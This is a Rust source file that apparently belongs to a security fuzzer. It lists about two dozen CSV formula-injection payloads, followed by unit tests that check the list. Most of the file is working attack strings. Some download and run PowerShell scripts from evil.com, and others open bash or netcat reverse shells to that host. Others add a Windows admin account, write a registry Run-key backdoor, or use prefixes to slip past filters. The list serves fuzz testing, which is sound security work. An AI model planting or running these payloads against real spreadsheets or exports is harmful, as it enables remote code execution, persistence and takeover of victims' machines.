use crate::fuzzer::payloads::{Payload, PayloadType, Severity};

pub fn get_payloads() -> Vec<Payload> {
    vec![
        Payload {
            payload_type: PayloadType::Csv,
            payload: "=cmd|' /C calc'!A0".to_string(),
            description: "CSV injection - calc.exe execution".to_string(),
            severity: Severity::Critical,
            tags: vec!["csv".to_string(), "injection".to_string(), "rce".to_string()],
        },
        Payload {
            payload_type: PayloadType::Csv,
            payload: "=cmd|'/c powershell -Command Invoke-WebRequest -Uri http://evil.com/shell.ps1 -OutFile shell.ps1'!A0".to_string(),
            description: "CSV injection - PowerShell download".to_string(),
            severity: Severity::Critical,
            tags: vec!["csv".to_string(), "injection".to_string(), "rce".to_string()],
        },
        Payload {
            payload_type: PayloadType::Csv,
            payload: "=cmd|'/c whoami'!A0".to_string(),
            description: "CSV injection - whoami command".to_string(),
            severity: Severity::Critical,
            tags: vec!["csv".to_string(), "injection".to_string()],
        },
        Payload {
            payload_type: PayloadType::Csv,
            payload: "=1+1".to_string(),
            description: "CSV injection - formula injection test".to_string(),
            severity: Severity::Medium,
            tags: vec!["csv".to_string(), "injection".to_string()],
        },
        Payload {
            payload_type: PayloadType::Csv,
            payload: "=SUM(1+1)".to_string(),
            description: "CSV injection - SUM formula".to_string(),
            severity: Severity::Medium,
            tags: vec!["csv".to_string(), "injection".to_string()],
        },
        Payload {
            payload_type: PayloadType::Csv,
            payload: "@SUM(1+1)".to_string(),
            description: "CSV injection - @SUM formula".to_string(),
            severity: Severity::Medium,
            tags: vec!["csv".to_string(), "injection".to_string()],
        },
        Payload {
            payload_type: PayloadType::Csv,
            payload: "=cmd|'/c dir'!A0".to_string(),
            description: "CSV injection - dir command".to_string(),
            severity: Severity::Critical,
            tags: vec!["csv".to_string(), "injection".to_string()],
        },
        Payload {
            payload_type: PayloadType::Csv,
            payload: "=cmd|'/c type C:\\Windows\\win.ini'!A0".to_string(),
            description: "CSV injection - read Windows file".to_string(),
            severity: Severity::Critical,
            tags: vec!["csv".to_string(), "injection".to_string()],
        },
        Payload {
            payload_type: PayloadType::Csv,
            payload: "=cmd|'/c net user admin /add'!A0".to_string(),
            description: "CSV injection - add Windows user".to_string(),
            severity: Severity::Critical,
            tags: vec!["csv".to_string(), "injection".to_string()],
        },
        Payload {
            payload_type: PayloadType::Csv,
            payload: "=cmd|'/c reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d C:\\backdoor.exe /f'!A0".to_string(),
            description: "CSV injection - registry persistence".to_string(),
            severity: Severity::Critical,
            tags: vec!["csv".to_string(), "injection".to_string(), "persistence".to_string()],
        },
        Payload {
            payload_type: PayloadType::Csv,
            payload: "=HYPERLINK(\"http://evil.com/malware.exe\",\"Click Here\")".to_string(),
            description: "CSV injection - hyperlink to malicious file".to_string(),
            severity: Severity::High,
            tags: vec!["csv".to_string(), "injection".to_string(), "phishing".to_string()],
        },
        Payload {
            payload_type: PayloadType::Csv,
            payload: "=HYPERLINK(\"javascript:alert(document.cookie)\")".to_string(),
            description: "CSV injection - JavaScript hyperlink".to_string(),
            severity: Severity::Critical,
            tags: vec!["csv".to_string(), "injection".to_string(), "xss".to_string()],
        },
        Payload {
            payload_type: PayloadType::Csv,
            payload: "=WEBSERVICE(\"http://evil.com/feed.xml\")".to_string(),
            description: "CSV injection - WEBSERVICE function".to_string(),
            severity: Severity::High,
            tags: vec!["csv".to_string(), "injection".to_string(), "ssrf".to_string()],
        },
        Payload {
            payload_type: PayloadType::Csv,
            payload: "=FILTERXML(\"http://evil.com/evil.xml\",\"//book/author\")".to_string(),
            description: "CSV injection - FILTERXML (XXE)".to_string(),
            severity: Severity::Critical,
            tags: vec!["csv".to_string(), "injection".to_string(), "xxe".to_string()],
        },
        Payload {
            payload_type: PayloadType::Csv,
            payload: "=IMAGE(\"http://evil.com/malware.png\")".to_string(),
            description: "CSV injection - IMAGE function".to_string(),
            severity: Severity::High,
            tags: vec!["csv".to_string(), "injection".to_string()],
        },
        Payload {
            payload_type: PayloadType::Csv,
            payload: r#"=DDE("cmd";"/c calc";"!")"#.to_string(),
            description: "CSV injection - DDE execution".to_string(),
            severity: Severity::Critical,
            tags: vec!["csv".to_string(), "injection".to_string(), "dde".to_string()],
        },
        Payload {
            payload_type: PayloadType::Csv,
            payload: "=MSEXCEL|\\'\\\\\\\\evil.com\\\\share\\\\malicious.xlm!A0".to_string(),
            description: "CSV injection - MSEXCEL formula".to_string(),
            severity: Severity::Critical,
            tags: vec!["csv".to_string(), "injection".to_string()],
        },
        Payload {
            payload_type: PayloadType::Csv,
            payload: "=cmd|'/c powershell -Command \"Start-Process calc\"'!A0".to_string(),
            description: "CSV injection - PowerShell Start-Process".to_string(),
            severity: Severity::Critical,
            tags: vec!["csv".to_string(), "injection".to_string(), "powershell".to_string()],
        },
        Payload {
            payload_type: PayloadType::Csv,
            payload: "=cmd|'/c powershell -Command \"IEX(New-Object Net.WebClient).DownloadString(\\\"http://evil.com/shell.ps1\\\")\"'!A0".to_string(),
            description: "CSV injection - PowerShell IEX download".to_string(),
            severity: Severity::Critical,
            tags: vec!["csv".to_string(), "injection".to_string(), "powershell".to_string()],
        },
        Payload {
            payload_type: PayloadType::Csv,
            payload: "=cmd|'/c bash -i >& /dev/tcp/evil.com/4444 0>&1'!A0".to_string(),
            description: "CSV injection - bash reverse shell".to_string(),
            severity: Severity::Critical,
            tags: vec!["csv".to_string(), "injection".to_string(), "shell".to_string()],
        },
        Payload {
            payload_type: PayloadType::Csv,
            payload: "=cmd|'/c nc -e cmd.exe evil.com 4444'!A0".to_string(),
            description: "CSV injection - netcat reverse shell".to_string(),
            severity: Severity::Critical,
            tags: vec!["csv".to_string(), "injection".to_string(), "shell".to_string()],
        },
        Payload {
            payload_type: PayloadType::Csv,
            payload: "\u{0000}=cmd|'/c calc'!A0".to_string(),
            description: "CSV injection - null byte prefix".to_string(),
            severity: Severity::High,
            tags: vec!["csv".to_string(), "injection".to_string(), "bypass".to_string()],
        },
        Payload {
            payload_type: PayloadType::Csv,
            payload: "'=cmd|'/c calc'!A0".to_string(),
            description: "CSV injection - single quote prefix".to_string(),
            severity: Severity::High,
            tags: vec!["csv".to_string(), "injection".to_string(), "bypass".to_string()],
        },
        Payload {
            payload_type: PayloadType::Csv,
            payload: "\t=cmd|'/c calc'!A0".to_string(),
            description: "CSV injection - tab prefix".to_string(),
            severity: Severity::High,
            tags: vec!["csv".to_string(), "injection".to_string(), "bypass".to_string()],
        },
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_csv_payloads_count() {
        let payloads = get_payloads();
        assert!(
            payloads.len() >= 20,
            "Expected at least 20 CSV payloads, got {}",
            payloads.len()
        );
    }

    #[test]
    fn test_csv_payloads_correct_type() {
        let payloads = get_payloads();
        for p in &payloads {
            assert_eq!(p.payload_type, PayloadType::Csv);
        }
    }

    #[test]
    fn test_csv_payloads_non_empty() {
        let payloads = get_payloads();
        for p in &payloads {
            assert!(!p.payload.is_empty());
            assert!(!p.description.is_empty());
            assert!(!p.tags.is_empty());
        }
    }

    #[test]
    fn test_csv_payloads_contain_cmd_injection() {
        let payloads = get_payloads();
        let has_cmd = payloads.iter().any(|p| p.payload.contains("=cmd|"));
        assert!(
            has_cmd,
            "CSV payloads should contain cmd injection patterns"
        );
    }

    #[test]
    fn test_csv_payloads_have_varied_severities() {
        use rustc_hash::FxHashSet;
        let payloads = get_payloads();
        let severities: FxHashSet<_> = payloads.iter().map(|p| p.severity).collect();
        assert!(
            severities.len() >= 2,
            "CSV payloads should have varied severities"
        );
    }
}
